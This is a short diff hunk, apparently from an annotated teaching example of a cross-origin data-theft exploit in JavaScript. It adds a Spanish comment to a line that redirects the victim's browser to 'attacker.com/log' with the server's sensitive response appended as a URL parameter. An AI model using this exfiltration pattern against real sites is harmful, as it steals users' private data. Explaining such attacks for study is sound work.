@@ -77,6 +77,8 @@ req.onload = function() {
     // Una vez que el navegador recibe la respuesta, se redirige a un dominio malicioso
     // incluyendo los datos sensibles como parámetro en la URL.
     location = 'https://attacker.com/log?data=' + this.responseText;
+    //  Esta línea redirige el navegador del usuario hacia el dominio del atacante,
+    //enviando como parámetro la respuesta completa del servidor.
 };
 
 // Configuramos la solicitud para apuntar a la información sensible
